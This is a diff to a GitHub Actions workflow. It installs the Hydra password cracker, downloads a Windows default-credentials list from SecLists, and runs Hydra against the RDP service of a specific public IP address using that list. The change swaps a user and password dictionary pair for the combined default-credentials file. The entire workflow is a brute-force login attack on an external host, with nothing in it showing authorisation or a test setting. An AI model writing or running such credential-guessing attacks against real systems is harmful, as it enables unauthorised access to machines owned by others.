@@ -8,7 +8,9 @@ jobs:
     steps:
       - uses: actions/checkout@v2         
       - name: Install Dependencies
-        run: sudo apt-get install hydra-gtk
+        run: |
+         sudo apt-get install hydra-gtk
+         wget --quiet https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt -O default.txt
       - name: Hydra
         run: |
-         hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://96.65.26.181
+         hydra -V -f -C default.txt rdp://96.65.26.181
